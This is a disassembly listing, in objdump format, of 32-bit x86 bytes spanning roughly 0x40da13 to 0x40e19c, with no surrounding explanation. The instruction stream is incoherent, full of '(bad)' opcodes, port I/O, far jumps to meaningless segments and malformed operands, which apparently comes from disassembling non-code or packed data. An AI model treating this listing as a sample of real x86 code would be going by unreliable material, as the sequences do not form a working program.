  40da13:	imul   edx,DWORD PTR [eax],0xb8991b5
  40da19:	add    BYTE PTR [ecx],dh
  40da1b:	mov    ch,0xc
  40da1d:	in     eax,dx
  40da1e:	es fwait
  40da20:	lock or al,0x9f
  40da23:	push   edx
  40da24:	js     0x40da45
  40da26:	jge    0x40d9fc
  40da28:	xor    bh,ch
  40da2a:	test   eax,0xe2bba1f3
  40da2f:	mov    al,ds:0x9c1ada6d
  40da34:	or     eax,DWORD PTR [esi]
  40da36:	or     al,0x75
  40da38:	pop    ebp
  40da39:	mov    ?,WORD PTR [esi+0x6b827f30]
  40da3f:	push   esp
  40da40:	pusha  
  40da41:	neg    DWORD PTR [ebx+0x19]
  40da44:	sbb    DWORD PTR [esi],0xffffffa6
  40da47:	sahf   
  40da48:	mov    edi,0xf103e6b
  40da4d:	jle    0x40da8a
  40da4f:	xchg   edi,eax
  40da50:	pop    ds
  40da51:	imul   ebx,ebx,0x618f99cf
  40da57:	mov    eax,0xd4eb66f4
  40da5c:	xchg   esi,eax
  40da5d:	data16 mov al,ds:0x2f982407
  40da63:	adc    esp,DWORD PTR ds:0xf7225741
  40da69:	ss add bh,dl
  40da6c:	outs   dx,DWORD PTR ds:[esi]
  40da6d:	fmul   DWORD PTR [edx+0x3a]
  40da70:	icebp  
  40da71:	pop    edi
  40da72:	(bad)  [ebp+0xd73fdbc]
  40da78:	(bad)  
  40da79:	test   DWORD PTR [esp+eiz*4+0x36],0x33487655
  40da81:	or     DWORD PTR [eax+0x4f6e36cf],esi
  40da87:	jl     0x40da96
  40da89:	push   edx
  40da8a:	icebp  
  40da8b:	lock add al,0x1c
  40da8e:	pop    eax
  40da8f:	push   ds
  40da90:	jl     0x40da62
  40da92:	cs xchg ebx,eax
  40da94:	or     ch,BYTE PTR [edx]
  40da96:	cmp    BYTE PTR [eax],0xfd
  40da99:	pop    ebx
  40da9a:	jg     0x40dadc
  40da9c:	inc    edi
  40da9d:	data16 cmp al,0x1
  40daa1:	loope  0x40db12
  40daa3:	sbb    bh,ah
  40daa5:	ds xchg ebp,eax
  40daa7:	enter  0xa062,0x55
  40daab:	push   es
  40daac:	sbb    cl,cl
  40daae:	add    eax,0xff0c2cf1
  40dab3:	scas   al,BYTE PTR es:[edi]
  40dab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab5:	ret    0x4db5
  40dab8:	lea    esi,[ebx+ebx*8]
  40dabb:	stc    
  40dabc:	rcr    DWORD PTR [ebx-0x3d],0xe3
  40dac0:	sub    BYTE PTR [ebp+0x32],0x57
  40dac4:	lods   eax,DWORD PTR ds:[esi]
  40dac5:	or     eax,DWORD PTR [ecx-0x3b]
  40dac8:	mov    bh,BYTE PTR [edi-0x3cf4c34a]
  40dace:	push   edi
  40dacf:	push   edx
  40dad0:	aaa    
  40dad1:	in     eax,dx
  40dad2:	mov    BYTE PTR [eax-0x7bfd1272],bl
  40dad8:	push   ebp
  40dad9:	sub    DWORD PTR [ecx+0x3b8d5d2c],esp
  40dadf:	out    0xfb,al
  40dae1:	inc    ebx
  40dae2:	(bad)
  40dae6:	test   al,0xa1
  40dae8:	aas    
  40dae9:	enter  0x5bff,0x34
  40daed:	pop    ecx
  40daee:	aaa    
  40daef:	(bad)  
  40daf0:	das    
  40daf1:	mov    cl,0x8d
  40daf3:	or     cl,BYTE PTR [ebx-0x72]
  40daf6:	mov    dh,0x6d
  40daf8:	mov    al,0x9b
  40dafa:	dec    esi
  40dafb:	stos   BYTE PTR es:[edi],al
  40dafc:	adc    edi,DWORD PTR [eax]
  40dafe:	lods   eax,DWORD PTR ds:[esi]
  40daff:	push   edi
  40db00:	mov    eax,ds:0x95a90cae
  40db05:	or     DWORD PTR [esi+0x60a09c8d],edi
  40db0b:	jns    0x40dae8
  40db0d:	sahf   
  40db0e:	js     0x40db63
  40db10:	jns    0x40daa1
  40db12:	push   esi
  40db13:	daa    
  40db14:	mov    al,0xd1
  40db16:	enter  0x9e7c,0xd7
  40db1a:	dec    edi
  40db1b:	jp     0x40daf5
  40db1d:	adc    al,0x14
  40db1f:	mov    ecx,0x44abddf8
  40db24:	js     0x40dba5
  40db26:	jno    0x40daef
  40db28:	pop    eax
  40db29:	js     0x40db80
  40db2b:	mov    al,0xe2
  40db2d:	sbb    ebx,eax
  40db2f:	and    dh,dh
  40db31:	retf   
  40db32:	pop    edi
  40db33:	pop    ecx
  40db34:	clc    
  40db35:	cmp    DWORD PTR [ecx+0x8581b86],esi
  40db3b:	fisub  WORD PTR [ebx+ecx*4]
  40db3e:	dec    esp
  40db3f:	nop
  40db40:	dec    esp
  40db41:	mov    cl,0xcd
  40db43:	imul   edi,ecx,0x5607b669
  40db49:	jmp    0x40db01
  40db4b:	lods   eax,DWORD PTR ds:[esi]
  40db4c:	call   0xdb4:0xc12451b1
  40db53:	inc    edi
  40db54:	(bad)  
  40db55:	outs   dx,BYTE PTR ds:[esi]
  40db56:	test   al,0x2e
  40db58:	mov    eax,ds:0x176630a7
  40db5d:	dec    esp
  40db5e:	or     eax,0xde62ef71
  40db63:	or     eax,0x121d11d6
  40db68:	mov    edi,0xdcd19cb5
  40db6d:	outs   dx,BYTE PTR ds:[esi]
  40db6e:	push   eax
  40db6f:	mov    ebp,0xece620b1
  40db74:	adc    esi,DWORD PTR [edx-0x3368df0f]
  40db7a:	push   0xffffff83
  40db7c:	cli    
  40db7d:	add    ebp,esp
  40db7f:	push   esp
  40db80:	cmp    al,0x80
  40db82:	lahf   
  40db83:	dec    ebp
  40db84:	or     edi,DWORD PTR [edi]
  40db86:	sbb    eax,0x2a82b43d
  40db8b:	addr16 js 0x40db5d
  40db8e:	and    al,0x3c
  40db90:	cmp    DWORD PTR [edx+0x5eb22680],0x5e
  40db97:	out    dx,eax
  40db98:	inc    ebp
  40db99:	addr16 shl bh,0xf8
  40db9d:	add    al,0x90
  40db9f:	adc    al,0x89
  40dba1:	jg     0x40db61
  40dba3:	fmul   DWORD PTR [edx-0x48]
  40dba6:	inc    esi
  40dba7:	adc    al,0x56
  40dba9:	mov    ss,edx
  40dbab:	and    BYTE PTR [ecx],ch
  40dbad:	pop    edi
  40dbae:	push   ebp
  40dbaf:	mov    bh,0xfa
  40dbb1:	push   eax
  40dbb2:	pop    ds
  40dbb3:	sahf   
  40dbb4:	test   ecx,ebx
  40dbb6:	stos   BYTE PTR es:[edi],al
  40dbb7:	add    al,al
  40dbb9:	cld    
  40dbba:	xchg   ecx,eax
  40dbbb:	sbb    BYTE PTR ds:0x5c38b805,ch
  40dbc1:	loope  0x40db74
  40dbc3:	test   eax,0x5a4286d
  40dbc8:	je     0x40db5c
  40dbca:	fs cmp eax,0xb52812a2
  40dbd0:	arpl   WORD PTR [eax-0x5],di
  40dbd3:	in     al,0xb3
  40dbd5:	add    al,0x48
  40dbd7:	rcr    DWORD PTR [ebp-0x26],cl
  40dbda:	mov    esp,0x2c75a9c7
  40dbdf:	out    0xf7,eax
  40dbe1:	xor    al,BYTE PTR ds:0x2dc3ff4c
  40dbe7:	scas   al,BYTE PTR es:[edi]
  40dbe8:	inc    edx
  40dbe9:	mov    cl,0xf
  40dbeb:	mov    BYTE PTR [eax],bl
  40dbed:	(bad)  
  40dbee:	cli    
  40dbef:	gs ret 
  40dbf1:	cs push edx
  40dbf3:	aam    0x6e
  40dbf5:	inc    esp
  40dbf6:	rcr    DWORD PTR [edi-0x1b],cl
  40dbf9:	mov    DWORD PTR [ebp+0x2f0141f2],edx
  40dbff:	jge    0x40dc21
  40dc01:	adc    eax,0x866b0610
  40dc06:	sub    dh,BYTE PTR [edx]
  40dc08:	mov    ebp,0xcf48b758
  40dc0d:	mov    dl,0x8
  40dc0f:	fs xchg ebx,eax
  40dc11:	jo     0x40dbbe
  40dc13:	xchg   esi,eax
  40dc14:	add    cl,BYTE PTR [edx+0x6b]
  40dc17:	jne    0x40dc0e
  40dc19:	not    DWORD PTR [edi-0x4af80351]
  40dc1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc20:	inc    esi
  40dc21:	sbb    BYTE PTR [ebp-0x6c],ah
  40dc24:	into   
  40dc25:	sub    dl,0x3c
  40dc28:	mov    ch,0x86
  40dc2a:	cmp    ecx,0x7f
  40dc2d:	sub    ch,bl
  40dc2f:	jo     0x40dc12
  40dc31:	sub    eax,0x3dc95202
  40dc36:	stos   DWORD PTR es:[edi],eax
  40dc37:	mov    cl,BYTE PTR [eax-0x40]
  40dc3a:	pop    esi
  40dc3b:	ja     0x40dbe4
  40dc3d:	xchg   esi,eax
  40dc3e:	dec    esi
  40dc3f:	aam    0x64
  40dc41:	(bad)  
  40dc42:	jns    0x40dc49
  40dc44:	gs in  al,dx
  40dc46:	arpl   bx,sp
  40dc48:	sbb    edi,DWORD PTR [esi+ebx*1+0x2b64972b]
  40dc4f:	fild   WORD PTR ds:0xb717718d
  40dc55:	dec    ebp
  40dc56:	not    BYTE PTR [edi+0x4da3e366]
  40dc5c:	push   ecx
  40dc5d:	and    eax,0x606acef
  40dc62:	inc    ebx
  40dc63:	pop    edi
  40dc64:	mov    bl,dl
  40dc66:	pop    ebp
  40dc67:	add    ebp,DWORD PTR [ebx+0x29]
  40dc6a:	push   ecx
  40dc6b:	in     eax,0x24
  40dc6d:	lods   eax,DWORD PTR ds:[esi]
  40dc6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc6f:	(bad)  
  40dc71:	push   ds
  40dc72:	es in  al,dx
  40dc74:	add    DWORD PTR [ebx+0x6d],esp
  40dc77:	fcomp  st(5)
  40dc79:	inc    edi
  40dc7a:	cdq    
  40dc7b:	clc    
  40dc7c:	call   0xa58d:0xcc8b5688
  40dc83:	shr    DWORD PTR [ebp+0x30],0x85
  40dc87:	adc    ch,bh
  40dc89:	pop    esi
  40dc8a:	mov    eax,0x2d4044d2
  40dc8f:	out    0xa7,al
  40dc91:	je     0x40dd02
  40dc93:	div    ebp
  40dc95:	jmp    DWORD PTR [ebx-0x30]
  40dc98:	cmp    al,dl
  40dc9a:	pop    ebp
  40dc9b:	cmp    DWORD PTR [eax+0x6b],edx
  40dc9e:	sahf   
  40dc9f:	pop    eax
  40dca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca1:	jno    0x40dcf6
  40dca3:	sub    dl,BYTE PTR [edx+0x24]
  40dca6:	scas   al,BYTE PTR es:[edi]
  40dca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dca8:	ror    BYTE PTR [ebx+0x7],cl
  40dcab:	stos   DWORD PTR es:[edi],eax
  40dcac:	jle    0x40dcda
  40dcae:	arpl   WORD PTR [ecx],dx
  40dcb0:	add    DWORD PTR [ebx],edi
  40dcb2:	repz bound esi,QWORD PTR [edx]
  40dcb5:	nop
  40dcb6:	jg     0x40dd03
  40dcb8:	push   esp
  40dcb9:	stc    
  40dcba:	fisttp WORD PTR [ebp+edi*2-0x13819c95]
  40dcc1:	scas   eax,DWORD PTR es:[edi]
  40dcc2:	mov    ebx,DWORD PTR [eax+ecx*4]
  40dcc5:	xchg   edx,eax
  40dcc6:	in     eax,0xca
  40dcc8:	dec    edi
  40dcc9:	(bad)  
  40dcca:	lahf   
  40dccb:	imul   esp,DWORD PTR [edi-0x77879848],0xf328693c
  40dcd5:	xchg   ebp,eax
  40dcd6:	dec    ebp
  40dcd7:	fnstsw WORD PTR [edi+0x2c]
  40dcda:	out    0x32,al
  40dcdc:	push   ebx
  40dcdd:	dec    eax
  40dcde:	pop    ebx
  40dcdf:	imul   ecx,DWORD PTR [edx+0xc16b7d1],0xfb26df71
  40dce9:	lds    ecx,FWORD PTR [esi+eiz*4-0x2e48433]
  40dcf0:	ficom  WORD PTR [ebx+0x72]
  40dcf3:	scas   al,BYTE PTR es:[edi]
  40dcf4:	or     bl,bl
  40dcf6:	mov    al,cs:0xa8ba3656
  40dcfc:	leave  
  40dcfd:	xchg   BYTE PTR [eax],cl
  40dcff:	je     0x40dd1b
  40dd01:	xchg   DWORD PTR [ecx-0x297d55f8],esp
  40dd07:	mov    dl,0x64
  40dd09:	lds    cx,DWORD PTR [edx-0x11]
  40dd0d:	cld    
  40dd0e:	into   
  40dd0f:	lock mov esp,0xbd943547
  40dd15:	inc    eax
  40dd16:	test   DWORD PTR gs:[edi-0x7],edi
  40dd1a:	pop    eax
  40dd1b:	ficomp WORD PTR ds:[esi]
  40dd1e:	adc    BYTE PTR gs:[esi+0x3e08a662],bl
  40dd25:	outs   dx,BYTE PTR ds:[esi]
  40dd26:	sub    BYTE PTR [edi+0x78e8fa41],ch
  40dd2c:	push   ds
  40dd2d:	fisubr WORD PTR [esi+0xb1d6ab]
  40dd33:	sbb    DWORD PTR [esi],edi
  40dd35:	cli    
  40dd36:	lds    eax,FWORD PTR [ebp-0x26]
  40dd39:	rol    bh,cl
  40dd3b:	in     eax,dx
  40dd3c:	jge    0x8c6c05
  40dd42:	sahf   
  40dd43:	(bad)  
  40dd44:	mov    bl,0x47
  40dd46:	mov    esi,0x3a69bace
  40dd4b:	jecxz  0x40ddb4
  40dd4d:	xchg   ebp,eax
  40dd4e:	addr16 push ss
  40dd50:	imul   eax,DWORD PTR [eax+0x6d4be1c5],0x6f0daa53
  40dd5a:	test   eax,0xfb137a76
  40dd5f:	cmp    DWORD PTR [ecx+edx*8-0x7d67ae69],esi
  40dd66:	and    esp,esi
  40dd68:	mov    ecx,0xf1627e1c
  40dd6d:	inc    edi
  40dd6e:	xor    al,0x35
  40dd70:	rol    edi,0xfa
  40dd73:	inc    ebx
  40dd74:	div    DWORD PTR ds:0x6bfaf78b
  40dd7a:	dec    ebp
  40dd7b:	call   0xc4c9fab0
  40dd80:	xor    eax,0xeb5df1f4
  40dd85:	in     al,0x9c
  40dd87:	repz loopne 0x40ddc9
  40dd8a:	or     eax,0x182f8622
  40dd8f:	xchg   DWORD PTR [eax-0x721c1cb7],esp
  40dd95:	(bad)  
  40dd96:	ss aad 0x7c
  40dd99:	test   eax,0x3f8f8a07
  40dd9e:	sahf   
  40dd9f:	dec    edi
  40dda0:	adc    eax,0xc0bfe2f6
  40dda5:	sbb    eax,0x7243d1ce
  40ddaa:	inc    edi
  40ddab:	fist   WORD PTR [eax+ebp*1]
  40ddae:	inc    edi
  40ddaf:	leave  
  40ddb0:	push   ebx
  40ddb1:	xor    DWORD PTR [ecx],esp
  40ddb3:	cmp    DWORD PTR [ebp+0x47],esi
  40ddb6:	hlt    
  40ddb7:	mov    ebp,0x75334869
  40ddbc:	pushf  
  40ddbd:	sub    edx,DWORD PTR [eax]
  40ddbf:	lds    ebp,FWORD PTR [edi]
  40ddc1:	stos   DWORD PTR es:[edi],eax
  40ddc2:	xchg   edi,eax
  40ddc3:	adc    dl,BYTE PTR [ecx-0x60]
  40ddc6:	jl     0x40dddf
  40ddc8:	jne    0x40de1e
  40ddca:	cld    
  40ddcb:	hlt    
  40ddcc:	lds    edi,FWORD PTR [esi+0x0]
  40ddcf:	push   0xffffff91
  40ddd1:	std    
  40ddd2:	adc    bl,dl
  40ddd4:	adc    ch,al
  40ddd6:	mov    al,0xe2
  40ddd8:	imul   ebp
  40ddda:	pop    es
  40dddb:	pop    ebx
  40dddc:	push   0x11008403
  40dde1:	lea    esp,[ecx+0x617cbf]
  40dde7:	cmp    esi,DWORD PTR [eax]
  40dde9:	(bad)  
  40ddea:	mov    ebp,0x9ee9147f
  40ddef:	inc    eax
  40ddf0:	xor    ebx,esi
  40ddf2:	repz fs push esp
  40ddf5:	xor    eax,0x5aeae7d1
  40ddfa:	or     al,0x35
  40ddfc:	arpl   WORD PTR ds:[ebx+edx*4+0x602c0ccf],bp
  40de04:	push   esp
  40de05:	std    
  40de06:	jmp    0xc11285a4
  40de0b:	mov    bl,0xf7
  40de0e:	add    ecx,esi
  40de10:	xor    eax,0x8ad2287b
  40de15:	push   ds
  40de16:	mov    ds:0x1c02a36e,eax
  40de1b:	inc    edx
  40de1c:	pop    edx
  40de1d:	mov    bl,dh
  40de1f:	dec    eax
  40de20:	idiv   DWORD PTR [ecx]
  40de22:	jo     0x40dda5
  40de24:	ret    0xa55e
  40de27:	iret   
  40de28:	add    edx,DWORD PTR [ebx]
  40de2a:	mov    ebx,0x9938ff43
  40de2f:	ret    
  40de30:	mov    ebp,0x5342bf9c
  40de35:	jnp    0x40de2e
  40de37:	enter  0xd69,0xd2
  40de3b:	add    BYTE PTR [edi],0x7
  40de3e:	rcl    dh,0xa
  40de41:	inc    edi
  40de42:	pop    ds
  40de43:	inc    edi
  40de44:	cdq    
  40de45:	cmc    
  40de46:	out    0xee,al
  40de48:	dec    edx
  40de49:	test   al,0x30
  40de4b:	mov    bl,BYTE PTR [ebp-0x3c5fb221]
  40de51:	mov    ch,ch
  40de53:	out    0x85,al
  40de55:	out    dx,eax
  40de56:	imul   ecx,ebx,0xfffffffd
  40de59:	jbe    0x40dde2
  40de5b:	scas   eax,DWORD PTR es:[edi]
  40de5c:	xor    DWORD PTR [ecx+0x6ebee9c0],ecx
  40de62:	je     0x40ddea
  40de64:	adc    cl,BYTE PTR [edx+0x7f]
  40de67:	test   BYTE PTR cs:[edi+0x41],ah
  40de6b:	adc    ch,ch
  40de6d:	je     0x40de22
  40de6f:	bound  eax,QWORD PTR ds:[ebp+0x11]
  40de73:	mov    edi,0x8a040498
  40de78:	imul   BYTE PTR [esi-0x78]
  40de7b:	jp     0x40de75
  40de7d:	add    ch,BYTE PTR ds:0xe4d0f254
  40de83:	cwde   
  40de84:	sub    BYTE PTR [eax-0x20],dl
  40de87:	cs cmp dl,bh
  40de8a:	cmp    al,0x9a
  40de8c:	arpl   WORD PTR [ebx],ax
  40de8e:	rol    bl,1
  40de90:	int    0x4e
  40de92:	adc    esp,ebx
  40de94:	dec    edx
  40de95:	in     eax,dx
  40de96:	icebp  
  40de97:	es in  al,dx
  40de99:	enter  0x61a3,0x6c
  40de9d:	add    al,0x6e
  40de9f:	inc    eax
  40dea0:	and    esi,esi
  40dea2:	cmp    al,0x64
  40dea4:	repnz add DWORD PTR [esi-0x72],esp
  40dea8:	cmp    esp,DWORD PTR [eax-0x21fc002e]
  40deae:	mov    dh,0x4f
  40deb0:	jo     0x40de7e
  40deb2:	mov    eax,ds:0xbd879dfa
  40deb7:	loope  0x40df20
  40deb9:	stos   DWORD PTR es:[edi],eax
  40deba:	imul   edx,DWORD PTR [ecx],0x444ca9e6
  40dec0:	sbb    edx,ebp
  40dec2:	jle    0x40dec2
  40dec4:	sbb    al,0x98
  40dec6:	mov    bl,0xd3
  40dec8:	xor    edi,DWORD PTR [eax+0x71]
  40decb:	inc    ecx
  40decc:	pop    ds
  40decd:	lods   al,BYTE PTR ds:[esi]
  40dece:	sub    edx,DWORD PTR [ebp+0xf]
  40ded1:	inc    esp
  40ded2:	jnp    0x40de91
  40ded4:	push   edi
  40ded5:	lds    esi,FWORD PTR [esi]
  40ded7:	gs arpl di,sp
  40deda:	mov    ch,0x14
  40dedc:	and    esi,ecx
  40dede:	push   ds
  40dedf:	cmp    dh,BYTE PTR [ebp+0x39805eae]
  40dee5:	xor    DWORD PTR [ecx+esi*2],edx
  40dee8:	push   0xffffff8b
  40deea:	and    BYTE PTR [eax-0x7f],cl
  40deed:	cmp    BYTE PTR [esi-0xb2e8a35],dh
  40def3:	gs popa 
  40def5:	inc    esp
  40def6:	pop    ds
  40def7:	push   ebp
  40def9:	aam    0x84
  40defb:	pop    eax
  40defc:	pop    ss
  40defd:	xchg   ebp,eax
  40defe:	jo     0x40deeb
  40df00:	sbb    eax,0x33b70382
  40df05:	lods   al,BYTE PTR ds:[esi]
  40df06:	retf   0xab33
  40df09:	inc    ebp
  40df0a:	mov    bh,0x95
  40df0c:	mov    eax,ds:0xea6814ce
  40df11:	test   al,0x60
  40df13:	xor    ah,BYTE PTR ds:0x1cab626d
  40df19:	push   edx
  40df1a:	jmp    0xbd505bdc
  40df1f:	(bad)  
  40df20:	mov    eax,ds:0x3c8b3381
  40df25:	mov    edi,0xee111191
  40df2a:	inc    ebp
  40df2b:	ret    
  40df2c:	add    DWORD PTR ds:0x992c115e,ebp
  40df32:	dec    eax
  40df33:	(bad)  
  40df34:	mov    WORD PTR [esi],es
  40df36:	add    eax,0xee49892a
  40df3b:	sbb    eax,0x15309f24
  40df40:	mov    BYTE PTR ds:0x87449846,cl
  40df46:	retf   
  40df47:	iret   
  40df48:	fst    QWORD PTR [ebp+0x18]
  40df4b:	int3   
  40df4c:	inc    edi
  40df4d:	out    0xf5,eax
  40df4f:	sub    eax,0xdb5cf189
  40df54:	pop    DWORD PTR ss:[edx+0x1b796a70]
  40df5b:	ret    
  40df5c:	cmp    DWORD PTR [ecx-0x704bbe33],ebx
  40df62:	cwde   
  40df63:	xor    ecx,DWORD PTR [ebx-0x1b]
  40df66:	cmp    ebp,DWORD PTR [ebx+0x16]
  40df69:	cmp    esp,ebx
  40df6b:	in     eax,0x83
  40df6d:	fidivr DWORD PTR [ebp+0x15]
  40df70:	mov    dh,0x97
  40df72:	mov    ds:0xb837fd0b,al
  40df77:	jp     0x40df28
  40df79:	mov    bl,0x7
  40df7b:	mov    dh,0x78
  40df7d:	xchg   BYTE PTR [bx+0x4a],cl
  40df81:	sub    cl,ch
  40df83:	(bad)  
  40df84:	retf   
  40df85:	repz dec ebp
  40df87:	jne    0x40df40
  40df89:	xor    edi,DWORD PTR [eax+0x5af2b37b]
  40df8f:	outs   dx,DWORD PTR ds:[esi]
  40df90:	adc    al,0xd9
  40df92:	jbe    0x40df48
  40df94:	fsubp  st(0),st
  40df96:	and    ch,BYTE PTR [edx]
  40df98:	inc    ebx
  40df99:	and    BYTE PTR [edi-0x1],ch
  40df9c:	cmp    ah,al
  40df9e:	pushw  0x67
  40dfa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfa2:	sti    
  40dfa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa4:	fsub   DWORD PTR [edx+eax*8]
  40dfa7:	repz shr DWORD PTR [ecx],1
  40dfaa:	in     al,dx
  40dfab:	out    0xf7,eax
  40dfad:	mov    esp,0xfbcdc058
  40dfb2:	retf   0x8cd8
  40dfb5:	xor    BYTE PTR ds:0xbb8b2cab,bh
  40dfbb:	out    0x24,al
  40dfbd:	rol    BYTE PTR [edi],cl
  40dfbf:	les    ebp,FWORD PTR [ecx-0x53]
  40dfc2:	aad    0x38
  40dfc4:	or     DWORD PTR [eax],edi
  40dfc6:	mov    edx,0x53f5595a
  40dfcb:	cdq    
  40dfcc:	dec    ecx
  40dfcd:	push   edi
  40dfce:	jbe    0x40dfe2
  40dfd0:	mov    ds:0xe9f20f3b,al
  40dfd5:	mov    eax,0xd804431d
  40dfda:	in     eax,0x93
  40dfdc:	mov    ebx,0x499879bf
  40dfe1:	gs dec edx
  40dfe3:	mov    esp,0x7163a22e
  40dfe8:	iret   
  40dfe9:	or     eax,0xd46f8311
  40dfee:	imul   esi,DWORD PTR [ebx],0xef620e97
  40dff4:	jmp    0x5f57:0x532fa425
  40dffb:	and    BYTE PTR [ecx],dl
  40dffd:	aaa    
  40dffe:	cmp    edi,DWORD PTR [edx-0x73]
  40e001:	pop    edi
  40e002:	inc    edx
  40e003:	(bad)  
  40e004:	sar    BYTE PTR [eax-0x85d1bde],cl
  40e00a:	push   ss
  40e00b:	out    dx,eax
  40e00c:	pop    ds
  40e00d:	shr    DWORD PTR [ebp-0x54e8567b],0xce
  40e014:	push   esi
  40e015:	btr    DWORD PTR [ebx],eax
  40e018:	mov    bh,0x86
  40e01a:	or     dh,BYTE PTR [ebx]
  40e01c:	fisttp QWORD PTR [ecx]
  40e01e:	push   ebx
  40e01f:	inc    esi
  40e020:	ds push esi
  40e022:	(bad)  
  40e023:	fisttp QWORD PTR [bp+di+0x61]
  40e027:	stc    
  40e028:	outs   dx,DWORD PTR ds:[esi]
  40e029:	lods   al,BYTE PTR ds:[esi]
  40e02a:	inc    edi
  40e02b:	mov    ecx,DWORD PTR [edx-0x160deaaf]
  40e031:	nop
  40e032:	mov    ah,0x4
  40e034:	xchg   esi,eax
  40e035:	lods   al,BYTE PTR ds:[esi]
  40e036:	fwait
  40e037:	test   al,0xbe
  40e039:	jmp    0x1fd6:0x56b9ddcb
  40e040:	arpl   WORD PTR [eax+0x61],bx
  40e043:	fwait
  40e044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e045:	je     0x40e02b
  40e047:	dec    eax
  40e048:	jge    0x40dfca
  40e04a:	(bad)  
  40e04b:	pop    es
  40e04c:	loop   0x40e0ab
  40e04e:	push   ecx
  40e04f:	in     eax,dx
  40e050:	sbb    DWORD PTR [ecx+0x21],edx
  40e053:	test   al,0x11
  40e055:	sub    BYTE PTR [ecx+0x5f827fa7],0x4e
  40e05c:	sub    al,0x6a
  40e05e:	jg     0x40e0b8
  40e060:	fsub   DWORD PTR [ecx-0x6475527f]
  40e066:	fsubp  st(6),st
  40e068:	test   BYTE PTR [ecx+0x1a],0x5
  40e06c:	adc    eax,0xa90c761b
  40e071:	pop    ds
  40e072:	mov    edx,0x2cb2271f
  40e077:	cmp    bl,BYTE PTR [edi]
  40e079:	mov    ds:0x88f19846,al
  40e07e:	mov    dh,0x4a
  40e080:	sub    BYTE PTR [edi],bl
  40e082:	pop    ecx
  40e083:	and    al,0xaa
  40e085:	fiadd  DWORD PTR [edi]
  40e087:	cmp    al,0xfd
  40e089:	lods   al,BYTE PTR ds:[esi]
  40e08a:	mov    esp,0x8662c511
  40e08f:	push   eax
  40e090:	test   ch,bl
  40e092:	ja     0x40e054
  40e094:	cmp    DWORD PTR [eax+0x17],ebp
  40e097:	lods   al,BYTE PTR ds:[esi]
  40e098:	dec    edx
  40e099:	gs sbb al,0x98
  40e09c:	pop    esi
  40e09d:	xchg   edx,eax
  40e09e:	xchg   BYTE PTR [edi],bh
  40e0a0:	clc    
  40e0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a2:	arpl   cx,bx
  40e0a4:	cmp    eax,0xce55c4f3
  40e0a9:	dec    edx
  40e0aa:	sahf   
  40e0ab:	rcl    al,cl
  40e0ad:	ds test al,0xdb
  40e0b0:	test   DWORD PTR [edi+0x4d053f83],edi
  40e0b6:	push   0x1e
  40e0b8:	sub    eax,0x8acc1296
  40e0bd:	shl    eax,cl
  40e0bf:	xor    al,0xa8
  40e0c1:	loope  0x40e069
  40e0c3:	dec    edi
  40e0c4:	jmp    0x1680daf
  40e0c9:	popa   
  40e0ca:	aaa    
  40e0cb:	cmp    eax,edi
  40e0cd:	pusha  
  40e0ce:	add    al,0x5a
  40e0d0:	push   esi
  40e0d1:	stos   DWORD PTR es:[edi],eax
  40e0d2:	imul   ebx,DWORD PTR [ecx-0x40],0x14678f1f
  40e0d9:	xor    DWORD PTR ds:0xc37d3295,0xecd16a8b
  40e0e3:	enter  0xebe9,0x87
  40e0e7:	stos   BYTE PTR es:[edi],al
  40e0e8:	sub    ebx,edi
  40e0ea:	std    
  40e0eb:	dec    ebp
  40e0ec:	pop    esi
  40e0ed:	idiv   DWORD PTR [ecx+edi*8-0x4987d571]
  40e0f4:	xchg   ecx,eax
  40e0f5:	mov    bh,0xd5
  40e0f7:	into   
  40e0f8:	mov    esp,0x7b3cd2c5
  40e0fd:	inc    esp
  40e0fe:	in     al,0x2d
  40e100:	xchg   edx,eax
  40e101:	shr    BYTE PTR [bp+si],cl
  40e104:	sub    ebp,DWORD PTR [ebp-0x74]
  40e107:	mov    eax,0x6fa92bc8
  40e10c:	cld    
  40e10d:	xchg   dh,ch
  40e10f:	sub    bl,dh
  40e111:	sbb    ah,ch
  40e113:	and    DWORD PTR [ebp-0x40c1107a],ebp
  40e119:	sbb    DWORD PTR [ebx-0x2d],ebx
  40e11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e11e:	lahf   
  40e11f:	mov    ebx,DWORD PTR [edx+0x1d8ae322]
  40e125:	or     dl,BYTE PTR [ecx]
  40e127:	lea    esi,[esi]
  40e129:	mov    ds:0xa506a3f8,al
  40e12e:	add    eax,0x5beddfb0
  40e133:	call   0x567b:0xf5127ab0
  40e13a:	or     DWORD PTR ds:0xc2ef422f,0x980f20f3
  40e144:	xchg   edx,eax
  40e145:	mov    ds:0x1cd77de2,eax
  40e14a:	into   
  40e14b:	inc    ecx
  40e14c:	fsub   QWORD PTR [edi-0x67]
  40e14f:	lock rol DWORD PTR [eax+esi*8+0x6e],cl
  40e154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e155:	bound  ebx,QWORD PTR [edi]
  40e157:	aad    0x64
  40e159:	inc    eax
  40e15a:	neg    ebp
  40e15c:	retf   
  40e15d:	sahf   
  40e15e:	or     eax,0xa4c8d925
  40e163:	fsubp  st(4),st
  40e165:	sub    esi,esi
  40e167:	rcl    eax,cl
  40e169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e16a:	fs hlt 
  40e16c:	repz add edx,DWORD PTR [edx+0x4a]
  40e170:	pop    edx
  40e171:	dec    eax
  40e172:	add    DWORD PTR [eax-0x1b],0xffffffb4
  40e176:	call   0x42c0:0x87457a9d
  40e17d:	int3   
  40e17e:	fidivr DWORD PTR [esi+0x5a]
  40e181:	dec    edx
  40e182:	and    ah,ah
  40e184:	ror    BYTE PTR [esi],0x2d
  40e187:	adc    eax,0xc4422c0b
  40e18c:	mov    esp,?
  40e18e:	imul   ebx,DWORD PTR [eax-0x57],0xffffffc4
  40e192:	mov    al,ds:0xa7b91cd2
  40e197:	repz and cl,bl
  40e19a:	jne    0x40e149
  40e19c:	fmul   DWORD PTR [ecx+0x1a]
